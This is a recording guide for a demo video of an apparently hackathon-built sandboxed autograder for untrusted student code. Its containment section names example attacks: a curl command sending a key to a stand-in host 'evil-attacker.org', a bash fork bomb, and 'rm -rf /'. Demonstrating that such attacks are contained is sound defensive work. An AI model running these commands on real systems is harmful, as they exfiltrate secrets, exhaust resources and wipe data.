# Demo Video Recording Guide (≤ 3 Minutes)

This guide walks you through recording the demonstration video for **AgentGuard-Celesto** (Hostile-Submission Autograder & Run Ledger).

The interactive control dashboard is live at: **[http://localhost:8000](http://localhost:8000)**  
API Interactive OpenAPI Docs: **[http://localhost:8000/docs](http://localhost:8000/docs)**

---

## 3-Minute Video Script

### 1. Introduction (0:00 - 0:30)
- **What is AgentGuard-Celesto?**  
  An autonomous autograder that runs untrusted student code inside Celesto microVM sandboxes with pre-execution safety hooks, isolated network policies (`network: false`), and snapshot recovery.
- Show the top stats bar:
  - **22 Evaluated Runs** (exceeds the 20-run hackathon requirement)
  - **86.4% Success Rate**
  - **100% Containment** (zero leaks to host)
  - **Rollback Recovery Policy** on Step 7 failure

### 2. Live Containment Detonation (0:30 - 1:15)
- Under **Live Attack Containment Detonator**, click:
  1. **"Prompt Injection"** — Watch the guest microVM audit stream show how indirect prompt injections (e.g. `curl -X POST https://evil-attacker.org/exfil?key=...`) are blocked by safety hooks and network isolation.
  2. **"Fork Bomb DoS"** — Click to show how fork bombs `:(){ :|:& };:` are trapped and neutralized before exhausting CPU quota.
  3. **"rm -rf / Wipe"** — Click to prove destructive commands never escape guest root and cannot touch the host system.

### 3. Live 10-Step Grading Agent & Step 7 Rollback (1:15 - 2:00)
- Under **Live 10-Step Grading Agent**:
  1. Click **"Run Nominal Grading (Pass)"** — See all 10 steps execute sequentially: sandbox boot → dependency install → test harness setup → test execution → evaluation → cleanup.
  2. Click **"Simulate Step 7 Fail & Rollback"** — Watch step 7 intentionally fail, triggering the **Rollback policy**: the agent instantly reverts to the pre-stress snapshot rather than re-creating the whole VM, saving 30-60 seconds.

### 4. Run Ledger & Report Artifacts (2:00 - 2:45)
- Scroll down to the **Run Ledger Audit Trail** table (`/api/runs`):
  - Point out that every run is verified with `execution_target: celesto_sandbox` and audit timestamps.
- Click through the **Generated Evaluation Artifacts** buttons:
  - `reliability.json` — shows the 22 completed benchmark runs with cost and wall-clock times.
  - `containment.json` — shows all attacks blocked and host integrity verified.
  - `failure_policy.json` — shows the architectural justification for Rollback.
  - `postmortem.md` — failure analysis and recovery mechanics.

### 5. Conclusion (2:45 - 3:00)
- Highlight that the system provides complete defense in depth:
  - MicroVM isolation (guest never reaches host)
  - Strict pre-execution safety hooks
  - Instant snapshot rollback
  - Complete auditable ledger.
